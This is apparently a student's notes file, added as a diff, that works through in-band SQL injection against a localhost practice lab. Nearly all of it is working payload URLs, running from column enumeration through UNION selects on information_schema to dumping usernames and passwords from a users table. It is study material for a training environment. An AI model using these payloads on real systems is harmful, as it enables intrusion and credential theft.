@@ -1,0 +1,66 @@
+SQL Injection
+-------------
+In Band
+-------
+
+http://localhost/sqli/Less-1/?id=1' (Error)
+
+Fix the query
+------------
+http://localhost/sqli/Less-1/?id=1' --+
+http://localhost/sqli/Less-1/?id=1' --%20
+
+Find number of records
+----------------------
+http://localhost/sqli/Less-1/?id=1 (keep change the id value until it shows error)
+
+
+Find number of colums
+---------------------
+http://localhost/sqli/Less-1/?id=1' order by 1 --+    No Error
+http://localhost/sqli/Less-1/?id=1' order by 2 --+    No Error
+http://localhost/sqli/Less-1/?id=1' order by 3 --+    No Error
+http://localhost/sqli/Less-1/?id=1' order by 4 --+    Error   (n-l) values
+
+
+Select query
+------------
+http://localhost/sqli/Less-1/?id=1' union select 1,2,3 --+
+
+
+http://localhost/sqli/Less-1/?id=-1' union select 1,2,3 --+  (place - before 1 you will be able to see the output of second select query i.e select 1,2,3)
+
+
+version of DB
+-------------
+http://localhost/sqli/Less-1/?id=-1' union select 1,2,version() --+
+
+
+name of DB
+----------
+http://localhost/sqli/Less-1/?id=-1' union select 1,2,database() --+
+
+
+find table name
+---------------
+id=-1' union select 1,table_name,3 from information_schema.tables where table_schema=database() --+
+
+
+id=-1' union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 1,1 --+ (change the value limit 1 to 2,3,4,5-----)
+
+
+To get all db name in single query
+-----------------------------------
+id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
+
+
+column name from table name
+---------------------------
+id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+
+
+
+id=-1' union select 1,group_concat(username),3 from users --+
+
+id=-1' union select 1,group_concat(password),3 from users --+
+
+id=-1' union select 1,group_concat(username),group_concat(password) from users --+
